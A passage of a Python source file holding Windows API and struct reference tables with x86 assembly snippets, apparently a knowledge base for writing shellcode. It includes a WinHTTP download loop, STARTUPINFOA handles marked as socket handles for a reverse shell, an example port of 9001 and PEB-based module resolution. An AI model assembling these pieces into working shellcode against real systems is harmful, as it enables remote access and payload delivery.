            "  push 0x1000                 ; dwNumberOfBytesToRead\n"
            "  push [ebp-alloc_ptr]        ; lpBuffer (advance pointer each iteration)\n"
            "  push [ebp-http_request]     ; hRequest\n"
            "  call [ebp-WinHttpReadData]\n"
            "  cmp dword [ebp-bytes_read], 0\n"
            "  je read_done                ; 0 bytes = transfer complete\n"
            "  mov eax, [ebp-bytes_read]\n"
            "  add [ebp-alloc_ptr], eax    ; advance write pointer\n"
            "  jmp read_loop"
        ),
    ),
    "WinHttpCloseHandle": APIRecord(
        module="winhttp.dll",
        category="internet",
        prototype="BOOL WinHttpCloseHandle(HINTERNET hInternet)",
        arguments=[
            Argument("hInternet", "HINTERNET", "any WinHTTP handle"),
        ],
        example=(
            "; Clean up all WinHTTP handles (close in reverse order)\n"
            "push [ebp-http_request]\n"
            "call [ebp-WinHttpCloseHandle]\n"
            "push [ebp-http_connect]\n"
            "call [ebp-WinHttpCloseHandle]\n"
            "push [ebp-http_session]\n"
            "call [ebp-WinHttpCloseHandle]"
        ),
    ),
}


STRUCT_DATABASE: dict[str, StructRecord] = {
    "STARTUPINFOA": StructRecord(
        size=0x44,
        alignment=4,
        fields=[
            StructField(0x00, "cb",         4, "must be 0x44"),
            StructField(0x2c, "dwFlags",    4, "STARTF_USESTDHANDLES = 0x100"),
            StructField(0x38, "hStdInput",  4, "socket handle"),
            StructField(0x3c, "hStdOutput", 4, "socket handle"),
            StructField(0x40, "hStdError",  4, "socket handle"),
        ],
    ),
    "PROCESS_INFORMATION": StructRecord(
        size=0x10,
        alignment=4,
        fields=[
            StructField(0x00, "hProcess",    4, "populated by Windows"),
            StructField(0x04, "hThread",     4, "populated by Windows"),
            StructField(0x08, "dwProcessId", 4, "populated by Windows"),
            StructField(0x0c, "dwThreadId",  4, "populated by Windows"),
        ],
    ),
    "PROCESSENTRY32": StructRecord(
        size=0x128,
        alignment=4,
        fields=[
            StructField(0x00, "dwSize",        4, "must be 0x128 = sizeof(PROCESSENTRY32)"),
            StructField(0x08, "th32ProcessID",  4, "PID of the process"),
            StructField(0x24, "szExeFile",    260, "null-terminated process name (MAX_PATH)"),
        ],
    ),
    "sockaddr_in": StructRecord(
        size=0x10,
        alignment=4,
        fields=[
            StructField(0x00, "sin_family", 2, "AF_INET = 0x0002"),
            StructField(0x02, "sin_port",   2, "network byte order, e.g. 0x2329 = port 9001"),
            StructField(0x04, "sin_addr",   4, "network byte order IPv4 address"),
            StructField(0x08, "sin_zero",   8, "zeroed padding"),
        ],
    ),
    "WSADATA": StructRecord(
        size=0x190,
        alignment=4,
        fields=[],
    ),
    "CHAR_BUFFER_128": StructRecord(
        size=0x80,
        alignment=4,
        fields=[],
    ),
    "CHAR_BUFFER_260": StructRecord(
        size=0x104,
        alignment=4,
        fields=[],
    ),
    "WIN32_FIND_DATAA": StructRecord(
        size=0x140,
        alignment=4,
        fields=[
            StructField(0x00, "dwFileAttributes", 4, "FILE_ATTRIBUTE_DIRECTORY=0x10, etc."),
            StructField(0x04, "ftCreationTime",   8, "FILETIME"),
            StructField(0x0C, "ftLastAccessTime", 8, "FILETIME"),
            StructField(0x14, "ftLastWriteTime",  8, "FILETIME"),
            StructField(0x1C, "nFileSizeHigh",    4, ""),
            StructField(0x20, "nFileSizeLow",     4, ""),
            StructField(0x2C, "cFileName",      260, "null-terminated filename (MAX_PATH)"),
            StructField(0x130, "cAlternateFileName", 14, "8.3 short name"),
        ],
    ),
}


# x64 structure layouts: fields have different offsets/sizes due to pointer width.
STRUCT_DATABASE_X64: dict[str, StructRecord] = {
    "STARTUPINFOA": StructRecord(
        size=0x68,
        alignment=8,
        fields=[
            StructField(0x00, "cb",         4, "must be 0x68 on x64"),
            StructField(0x3c, "dwFlags",    4, "STARTF_USESTDHANDLES = 0x100"),
            StructField(0x50, "hStdInput",  8, "socket handle (HANDLE is 8 bytes on x64)"),
            StructField(0x58, "hStdOutput", 8, "socket handle"),
            StructField(0x60, "hStdError",  8, "socket handle"),
        ],
    ),
    "PROCESS_INFORMATION": StructRecord(
        size=0x18,
        alignment=8,
        fields=[
            StructField(0x00, "hProcess",    8, "populated by Windows"),
            StructField(0x08, "hThread",     8, "populated by Windows"),
            StructField(0x10, "dwProcessId", 4, "populated by Windows"),
            StructField(0x14, "dwThreadId",  4, "populated by Windows"),
        ],
    ),
    "sockaddr_in": StructRecord(
        size=0x10,
        alignment=4,
        fields=[
            StructField(0x00, "sin_family", 2, "AF_INET = 0x0002"),
            StructField(0x02, "sin_port",   2, "network byte order"),
            StructField(0x04, "sin_addr",   4, "network byte order IPv4 address"),
            StructField(0x08, "sin_zero",   8, "zeroed padding"),
        ],
    ),
    "WSADATA": StructRecord(
        size=0x190,
        alignment=8,
        fields=[],
    ),
    "CHAR_BUFFER_128": StructRecord(
        size=0x80,
        alignment=8,
        fields=[],
    ),
    "CHAR_BUFFER_260": StructRecord(
        size=0x108,
        alignment=8,
        fields=[],
    ),
}


MODULE_LOAD_ORDER: list[ModuleInfo] = [
    ModuleInfo(dll="kernel32.dll", load_via="peb"),
    ModuleInfo(dll="ntdll.dll",    load_via="peb"),
    ModuleInfo(dll="ws2_32.dll",   load_via="LoadLibraryA"),
    ModuleInfo(dll="wininet.dll",  load_via="LoadLibraryA"),
    ModuleInfo(dll="winhttp.dll",  load_via="LoadLibraryA"),
    ModuleInfo(dll="advapi32.dll", load_via="LoadLibraryA"),
    ModuleInfo(dll="urlmon.dll",   load_via="LoadLibraryA"),
    ModuleInfo(dll="user32.dll",   load_via="LoadLibraryA"),
    ModuleInfo(dll="userenv.dll",  load_via="LoadLibraryA"),
    ModuleInfo(dll="shell32.dll",  load_via="LoadLibraryA"),
]


def get_record(name: str) -> APIRecord:
    """Look up an API by name. Raises KeyError with a clear message if not found."""
    if name not in API_DATABASE:
        raise KeyError(f"'{name}' not found in API_DATABASE")
    return API_DATABASE[name]
